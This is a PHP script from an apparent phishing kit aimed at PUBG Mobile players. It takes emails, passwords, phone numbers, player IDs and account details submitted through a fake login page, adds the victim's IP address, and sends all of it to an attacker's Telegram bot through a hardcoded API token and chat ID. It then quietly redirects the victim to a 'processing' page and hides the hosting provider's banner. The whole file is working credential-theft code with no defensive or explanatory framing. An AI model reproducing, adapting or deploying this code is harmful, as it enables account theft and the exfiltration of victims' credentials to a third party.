<?php

$username = $_POST['email'];
$password = $_POST['password'];
$phone = $_POST['phone'];
$login = $_POST['login'];
$playid = $_POST['playid'];
$level = $_POST['level'];
$tier = $_POST['tier'];
$rpt = $_POST['rpt'];
$rpl = $_POST['rpl'];
$time = date('Y-m-d H:i:s');
$platform = $_POST['platform'];
$country = $_POST['country'];
 
 
 $ip =$_SERVER['REMOTE_ADDR'];

$apiToken = "1202976243:AAGu0fEqzQvT-PkFnL3IqycxB2Qh9ILjNWY";
$chat = "997292854";
$data = [
    'chat_id' => $chat,
    'text' => "❄⊚-----------------------------------⊚❄
☠ PUBG Mobile Account ☠
 
• ✉ Email :- $username
• 💎 Pass  :- $password
• ☎ Tell.U :- $phone
• 🗝 Login :- $login
• 🤡 PlayID:- $playid
• 〽 Level  :- $level
• 👁️️ IP        :- $ip
• 🃏 Point  :- $tier
• ♠ RP.T    :- $rpt
• ♣ RP.L    :- $rpl
• 📱 Hand  :- $platform
• ⏲ Time   :- $time
• 🌐 By : @darkzonepubg
❄⊚-----------------------------------⊚❄"
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

?>


<html> 
  <head>     <style>img[alt="www.000webhost.com"]{display:none;}</style>
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-159654279-2"></script> 
<script> 
  window.dataLayer = window.dataLayer || []; 
  function gtag(){dataLayer.push(arguments);} 
  gtag('js', new Date()); 
 
  gtag('config', 'UA-159654279-2'); 
</script> 
 
    <meta http-equiv="Refresh" content="0; url='processing.php'" /> 
  </head> 
  <body> 
  </body> 
</html>